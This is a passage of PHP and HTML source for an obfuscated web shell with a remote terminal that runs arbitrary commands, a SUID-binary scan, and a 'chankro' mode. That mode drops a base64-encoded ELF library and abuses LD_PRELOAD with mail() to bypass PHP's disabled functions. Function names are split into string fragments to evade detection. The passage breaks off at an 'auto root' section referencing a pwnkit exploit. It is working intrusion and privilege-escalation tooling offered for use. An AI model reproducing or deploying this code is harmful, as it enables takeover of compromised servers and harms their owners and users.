                <div class="flex items-center justify-between p-4 border-b border-slate-700">
                    <h3 class="text-lg font-bold">
                        <i class="fas fa-code icon-blue mr-2"></i> Code Editor : <?= unx($_GET['f']); ?>
                    </h3>
                    <button id="close-editor-btn" class="text-gray-400 hover:text-white">&times;</button>
                </div>
                <form action="" method="post" class="flex-1 flex flex-col">
                    <textarea name="code-editor" id="code" class="flex-1"><?= $fungsi[10]($fungsi[11]($fungsi[0]() . "/" . unx($_GET['f']))); ?></textarea>
                    <div class="flex justify-end p-4 border-t border-slate-700 space-x-2">
                        <button type="submit" name="save-editor" class="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded">Save</button>
                        <button id="close-editor-btn" class="bg-slate-700 hover:bg-slate-600 text-white px-4 py-2 rounded">Close</button>
                    </div>
                </form>
            </div>
        </div>
    <?php endif; ?>
    
    <?php if ($_GET['terminal'] == "normal") : ?>
        <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
            <div class="glass-effect rounded-lg w-full max-w-4xl h-[80vh] flex flex-col modal-content">
                <div class="flex items-center justify-between p-4 border-b border-slate-700">
                    <h3 class="text-lg font-bold">
                        <i class="fas fa-terminal icon-green mr-2"></i> TERMINAL
                    </h3>
                    <a href="" class="close-terminal text-gray-400 hover:text-white">&times;</a>
                </div>
                <textarea class="terminal-output flex-1 overflow-auto p-4" disabled><?php if (isset($_POST['terminal'])) { echo $fungsi[10](cmd($_POST['terminal-text'] . " 2>&1"));} ?>
                </textarea>
                <form action="" method="post" class="p-4 border-t border-slate-700 flex">
                    <input type="text" name="terminal-text" class="terminal-input flex-1 rounded-l px-3 py-2" placeholder="<?= $fungsi[9]() . "@" . $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]; ?>" autofocus>
                    <button type="submit" name="terminal" class="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded-r">
                        >
                    </button>
                </form>
            </div>
        </div>
    <?php endif; ?>
    <?php if ($_GET['scan'] == "suid") : ?>
        <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
            <div class="glass-effect rounded-lg w-full max-w-4xl h-[80vh] flex flex-col modal-content">
                <div class="flex items-center justify-between p-4 border-b border-slate-700">
                    <h3 class="text-lg font-bold">
                        <i class="fas fa-terminal icon-green mr-2"></i> TERMINAL
                    </h3>
                    <a href="" class="close-terminal text-gray-400 hover:text-white">&times;</a>
                </div>
                <textarea class="terminal-output flex-1 overflow-auto p-4" disabled><?php echo $fungsi[10](cmd("find / -user root -perm /4000 2>/dev/null")); ?>
                </textarea>
            </div>
        </div>
    <?php endif; ?>
    <?php if ($_GET['terminal'] == "chankro") : ?>
        <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
            <div class="glass-effect rounded-lg w-full max-w-4xl h-[80vh] flex flex-col modal-content">
                <div class="flex items-center justify-between p-4 border-b border-slate-700">
                    <h3 class="text-lg font-bold">
                        <i class="fas fa-terminal icon-green mr-2"></i> TERMINAL
                    </h3>
                    <a href="" class="close-terminal text-gray-400 hover:text-white">&times;</a>
                </div>
                <div class="terminal-output flex-1 overflow-auto p-4">
                <?php
                    if (isset($_POST['terminal-chankro'])) {
                        $p = "p"."u"."t"."e"."n"."v";
                        $a = "fi"."le_p"."ut_c"."ont"."e"."nt"."s";
                        $m = "m"."a"."i"."l";
                        $base = "ba"."se"."64"."_"."de"."co"."de";
                        $en = "ba"."se"."64"."_"."en"."co"."de";
                        $mb = "m"."b"."_"."s"."e"."n"."d"."_"."m"."a"."i"."l";
                        $err = "e"."r"."r"."o"."r"."_"."l"."o"."g";
                        $drnm = "d"."i"."r"."n"."a"."m"."e";
                        $imp = "i"."m"."a"."p"."_"."m"."a"."i"."l";
                        $currentFilePath = $_SERVER['PHP_SELF'];
                        $doc = $_SERVER['DOCUMENT_ROOT'];
                        $directoryPath = dirname($currentFilePath);
                        $full = $doc . $directoryPath;
                        $is_https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || $_SERVER['SERVER_PORT'] == 443;
                        $host = $_SERVER['HTTP_HOST'];
                        $script_path = $_SERVER['SCRIPT_NAME'];
                        $new_path = str_replace(basename($script_path), 'test.txt', $script_path);
                        $full_url = ($is_https ? 'https://' : 'http://') . $host . $new_path;
                        if(isset($_POST['exechankro'])){
                            $hook = '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BwAAAAwAAAAAAAAAAAAAAEiD7AhIiwW9CCAASIXAdAL/0EiDxAjDAP810gggAP8l1AggAA8fQAD/JdIIIABoAAAAAOng/////yXKCCAAaAEAAADp0P////8lwgggAGgCAAAA6cD/////JboIIABoAwAAAOmw/////yWyCCAAaAQAAADpoP////8lqgggAGgFAAAA6ZD/////JaIIIABoBgAAAOmA/////yWaCCAAaAcAAADpcP////8lkgggAGgIAAAA6WD/////JSIIIABmkAAAAAAAAAAASI09gQggAEiNBYEIIABVSCn4SInlSIP4DnYVSIsF1gcgAEiFwHQJXf/gZg8fRAAAXcMPH0AAZi4PH4QAAAAAAEiNPUEIIABIjTU6CCAAVUgp/kiJ5UjB/gNIifBIweg/SAHGSNH+dBhIiwWhByAASIXAdAxd/+BmDx+EAAAAAABdww8fQABmLg8fhAAAAAAAgD3xByAAAHUnSIM9dwcgAABVSInldAxIiz3SByAA6D3////oSP///13GBcgHIAAB88MPH0AAZi4PH4QAAAAAAEiNPVkFIABIgz8AdQvpXv///2YPH0QAAEiLBRkHIABIhcB06VVIieX/0F3pQP///1VIieVIjT16AAAA6FD+//++/wEAAEiJx+iT/v//SI09YQAAAOg3/v//SInH6E/+//+QXcNVSInlvgEAAAC/AQAAAOhZ/v//6JT+//+FwHQKvwAAAADodv7//5Bdw1VIieVIjT0lAAAA6FP+///o/v3//+gZ/v//kF3DAABIg+wISIPECMNDSEFOS1JPAExEX1BSRUxPQUQAARsDOzQAAAAFAAAAuP3//1AAAABY/v//eAAAAGj///+QAAAAnP///7AAAADF////0AAAAAAAAAAUAAAAAAAAAAF6UgABeBABGwwHCJABAAAkAAAAHAAAAGD9//+gAAAAAA4QRg4YSg8LdwiAAD8aOyozJCIAAAAAFAAAAEQAAADY/f//CAAAAAAAAAAAAAAAHAAAAFwAAADQ/v//NAAAAABBDhCGAkMNBm8MBwgAAAAcAAAAfAAAAOT+//8pAAAAAEEOEIYCQw0GZAwHCAAAABwAAACcAAAA7f7//x0AAAAAQQ4QhgJDDQZYDAcIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsAgAAAAAAAAAAAAAAAAAAHAIAAAAAAAAAAAAAAAAAAABAAAAAAAAALsAAAAAAAAADAAAAAAAAAAYBwAAAAAAAA0AAAAAAAAAXAkAAAAAAAAZAAAAAAAAAPgNIAAAAAAAGwAAAAAAAAAQAAAAAAAAABoAAAAAAAAACA4gAAAAAAAcAAAAAAAAAAgAAAAAAAAA9f7/bwAAAADwAQAAAAAAAAUAAAAAAAAAMAQAAAAAAAAGAAAAAAAAADgCAAAAAAAACgAAAAAAAADpAAAAAAAAAAsAAAAAAAAAGAAAAAAAAAADAAAAAAAAAAAQIAAAAAAAAgAAAAAAAADYAAAAAAAAABQAAAAAAAAABwAAAAAAAAAXAAAAAAAAAEAGAAAAAAAABwAAAAAAAABoBQAAAAAAAAgAAAAAAAAA2AAAAAAAAAAJAAAAAAAAABgAAAAAAAAA/v//bwAAAABIBQAAAAAAAP///28AAAAAAQAAAAAAAADw//9vAAAAABoFAAAAAAAA+f//bwAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgOIAAAAAAAAAAAAAAAAAAAAAAAAAAAAEYHAAAAAAAAVgcAAAAAAABmBwAAAAAAAHYHAAAAAAAAhgcAAAAAAACWBwAAAAAAAKYHAAAAAAAAtgcAAAAAAADGBwAAAAAAAGAQIAAAAAAAR0NDOiAoRGViaWFuIDYuMy4wLTE4K2RlYjl1MSkgNi4zLjAgMjAxNzA1MTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAQDIAQAAAAAAAAAAAAAAAAAAAAAAAAMAAgDwAQAAAAAAAAAAAAAAAAAAAAAAAAMAAwA4AgAAAAAAAAAAAAAAAAAAAAAAAAMABAAwBAAAAAAAAAAAAAAAAAAAAAAAAAMABQAaBQAAAAAAAAAAAAAAAAAAAAAAAAMABgBIBQAAAAAAAAAAAAAAAAAAAAAAAAMABwBoBQAAAAAAAAAAAAAAAAAAAAAAAAMACABABgAAAAAAAAAAAAAAAAAAAAAAAAMACQAYBwAAAAAAAAAAAAAAAAAAAAAAAAMACgAwBwAAAAAAAAAAAAAAAAAAAAAAAAMACwDQBwAAAAAAAAAAAAAAAAAAAAAAAAMADADgBwAAAAAAAAAAAAAAAAAAAAAAAAMADQBcCQAAAAAAAAAAAAAAAAAAAAAAAAMADgBlCQAAAAAAAAAAAAAAAAAAAAAAAAMADwB4CQAAAAAAAAAAAAAAAAAAAAAAAAMAEACwCQAAAAAAAAAAAAAAAAAAAAAAAAMAEQD4DSAAAAAAAAAAAAAAAAAAAAAAAAMAEgAIDiAAAAAAAAAAAAAAAAAAAAAAAAMAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAMAFAAYDiAAAAAAAAAAAAAAAAAAAAAAAAMAFQDYDyAAAAAAAAAAAAAAAAAAAAAAAAMAFgAAECAAAAAAAAAAAAAAAAAAAAAAAAMAFwBgECAAAAAAAAAAAAAAAAAAAAAAAAMAGABoECAAAAAAAAAAAAAAAAAAAAAAAAMAGQAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAADAAAAAEAEwAQDiAAAAAAAAAAAAAAAAAAGQAAAAIADADgBwAAAAAAAAAAAAAAAAAAGwAAAAIADAAgCAAAAAAAAAAAAAAAAAAALgAAAAIADABwCAAAAAAAAAAAAAAAAAAARAAAAAEAGABoECAAAAAAAAEAAAAAAAAAUwAAAAEAEgAIDiAAAAAAAAAAAAAAAAAAegAAAAIADACwCAAAAAAAAAAAAAAAAAAAhgAAAAEAEQD4DSAAAAAAAAAAAAAAAAAApQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAArAAAAAEAEABoCgAAAAAAAAAAAAAAAAAAugAAAAEAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAxgAAAAEAFwBgECAAAAAAAAAAAAAAAAAA0wAAAAEAFAAYDiAAAAAAAAAAAAAAAAAA3AAAAAAADwB4CQAAAAAAAAAAAAAAAAAA7wAAAAEAFwBoECAAAAAAAAAAAAAAAAAA+wAAAAEAFgAAECAAAAAAAAAAAAAAAAAAEQEAABIAAAAAAAAAAAAAAAAAAAAAAAAAJQEAACAAAAAAAAAAAAAAAAAAAAAAAAAAQQEAABAAFwBoECAAAAAAAAAAAAAAAAAA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';
                            $cmdd = $_POST['exechankro'];
                            $meterpreter = $en($cmdd." > test.txt");
                            $viewCommandResult = '<hr><p>Result: base64 : ' . $meterpreter .'</br>If no output appears, <br>please check manually by opening '.$full_url.'<br>Or u can check command with reverse shell script<br>Powered By @ Juuzo1337<br><br>';        
                            $a($full . '/chankro.so', $base($hook));
                            $a($full . '/acpid.socket', $base($meterpreter));
                            $p('CHANKRO=' . $full . '/acpid.socket');
                            $p('LD_PRELOAD=' . $full . '/chankro.so');
                            if(function_exists('mail')) {
                                $m('a','a','a','a');
                                echo $viewCommandResult;
                                $is_https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || $_SERVER['SERVER_PORT'] == 443;
                                $host = $_SERVER['HTTP_HOST'];
                                $script_path = $_SERVER['SCRIPT_NAME'];
                                $new_path = str_replace(basename($script_path), 'test.txt', $script_path);
                                $full_url = ($is_https ? 'https://' : 'http://') . $host . $new_path;
                                sleep(5);
                                $content = file_get_contents($full_url);
                                echo $content;
                            } elseif(function_exists('mb_send_mail')) {
                                $mb('a','a','a','a'); 
                                echo $viewCommandResult;
                                $is_https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || $_SERVER['SERVER_PORT'] == 443;
                                $host = $_SERVER['HTTP_HOST'];
                                $script_path = $_SERVER['SCRIPT_NAME'];
                                $new_path = str_replace(basename($script_path), 'test.txt', $script_path);
                                $full_url = ($is_https ? 'https://' : 'http://') . $host . $new_path;
                                sleep(5);
                                $content = file_get_contents($full_url);
                                echo $content;
                            } elseif(function_exists('error_log')) {
                                $err('a',1,'a');
                                echo $viewCommandResult;
                                $is_https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || $_SERVER['SERVER_PORT'] == 443;
                                $host = $_SERVER['HTTP_HOST'];
                                $script_path = $_SERVER['SCRIPT_NAME'];
                                $new_path = str_replace(basename($script_path), 'test.txt', $script_path);
                                $full_url = ($is_https ? 'https://' : 'http://') . $host . $new_path;
                                sleep(5);
                                $content = file_get_contents($full_url);
                                echo $content;
                            } elseif(function_exists('imap_mail')) {
                                $imp('a','a','a');
                                echo $viewCommandResult;
                                $is_https = (!empty($_SERVER['HTTPS']) and $_SERVER['HTTPS'] !== 'off') or $_SERVER['SERVER_PORT'] == 443;
                                $host = $_SERVER['HTTP_HOST'];
                                $script_path = $_SERVER['SCRIPT_NAME'];
                                $new_path = str_replace(basename($script_path), 'test.txt', $script_path);
                                $full_url = ($is_https ? 'https://' : 'http://') . $host . $new_path;
                                sleep(5);
                                $content = file_get_contents($full_url);
                                echo $content;
                            }
                        }
                    }
                ?>
                </div>
                <form action="" method="post" class="p-4 border-t border-slate-700 flex">
                    <input type="text" name="exechankro" class="terminal-input flex-1 rounded-l px-3 py-2" placeholder="<?= $fungsi[9]() . "@" . $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]; ?>" autofocus>
                    <button type="submit" name="terminal-chankro" class="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded-r">
                        >
                    </button>
                </form>
            </div>
        </div>
    <?php endif; ?>

    <?php if ($_GET['terminal'] == "root") : ?>
        <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
            <div class="glass-effect rounded-lg w-full max-w-4xl h-[80vh] flex flex-col modal-content">
                <div class="flex items-center justify-between p-4 border-b border-slate-700">
                    <h3 class="text-lg font-bold">
                        <i class="fas fa-user-shield icon-red mr-2"></i> AUTO ROOT
                    </h3>
                    <a href="" class="close-terminal text-gray-400 hover:text-white">&times;</a>
                </div>
                <textarea class="terminal-output flex-1 overflow-auto p-4" disabled><?php if ($fungsi[3]('.Juuzo1337-root') && $fungsi[3]('pwnkit')) {
